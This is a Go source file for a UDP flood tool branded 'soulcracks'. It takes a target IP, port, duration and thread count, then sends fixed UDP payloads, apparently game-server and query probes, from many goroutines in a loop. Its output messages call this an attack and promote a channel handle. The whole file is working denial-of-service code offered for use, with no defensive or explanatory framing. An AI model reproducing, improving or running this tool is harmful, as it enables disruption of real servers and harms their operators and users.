package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func usage() {
	fmt.Println("Usage: ./soulcracks ip port time threads")
	os.Exit(1)
}

type threadData struct {
	ip    string
	port  int
	time  int
}

func attack(data threadData, wg *sync.WaitGroup) {
	defer wg.Done()

	payloads := [][]byte{
		[]byte{0xd9, 0x00},
		[]byte{0x00, 0x00},
		[]byte{0xd9, 0x00, 0x00},
		[]byte{0x72, 0xfe, 0x1d, 0x13, 0x00, 0x00},
		[]byte{0x30, 0x3a, 0x02, 0x01, 0x03, 0x30, 0x0f, 0x02, 0x02, 0x4a, 0x69, 0x02, 0x03, 0x00, 0x00},
		[]byte{0x05, 0xca, 0x7f, 0x16, 0x9c, 0x11, 0xf9, 0x89, 0x00, 0x00},
		[]byte{0x53, 0x4e, 0x51, 0x55, 0x45, 0x52, 0x59, 0x3a, 0x20, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31, 0x3a, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x3a, 0x78, 0x73, 0x76, 0x72, 0x00, 0x00},
	}

	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", data.ip, data.port))
	if err != nil {
		fmt.Println("Socket creation failed:", err)
		return
	}
	defer conn.Close()

	endTime := time.Now().Add(time.Duration(data.time) * time.Second)

	for time.Now().Before(endTime) {
		for _, payload := range payloads {
			_, err := conn.Write(payload)
			if err != nil {
				fmt.Println("Send failed:", err)
				return
			}
		}
	}
}

func main() {
	if len(os.Args) != 5 {
		usage()
	}

	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid port")
		usage()
	}

	timeLimit, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid time")
		usage()
	}

	threads, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("Invalid thread count")
		usage()
	}

	data := threadData{
		ip:   ip,
		port: port,
		time: timeLimit,
	}

	var wg sync.WaitGroup
	fmt.Printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, timeLimit, threads)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(data, &wg)
		fmt.Printf("Launched thread %d\n", i+1)
	}

	wg.Wait()
	fmt.Println("Attack finished join @soulcracks")
}
